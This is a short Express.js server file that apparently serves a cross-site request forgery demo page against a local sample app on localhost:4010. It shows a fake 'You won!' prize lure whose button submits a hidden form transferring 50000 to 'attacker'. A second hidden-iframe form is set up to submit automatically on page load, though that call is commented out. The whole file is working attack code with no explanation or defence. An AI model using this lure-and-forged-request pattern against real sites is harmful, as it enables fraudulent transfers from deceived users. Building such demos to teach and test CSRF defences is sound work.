const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send(`
    <h1>Congratulations! You won!</h1>
    <p>Click the button to receive your prize</p>
    <button onclick="document.getElementById('csrf-form').submit()">
      Receive prize
    </button>

    <!-- Hidden form: sends a transfer request to the victim site -->
    <form id="csrf-form" method="POST" action="http://localhost:4010/transfer" style="display:none">
      <input name="to" value="attacker">
      <input name="amount" value="50000">
    </form>

    <!-- Auto-submit version (attack fires just by opening the page) -->
    <iframe name="hidden-frame" style="display:none"></iframe>
    <form id="auto-csrf" method="POST" action="http://localhost:4010/transfer" target="hidden-frame">
      <input name="to" value="attacker">
      <input name="amount" value="10000">
    </form>
    <script>
      // document.getElementById('auto-csrf').submit();
    </script>
  `);
});

app.listen(4011, () => console.log("Attacker: http://localhost:4011"));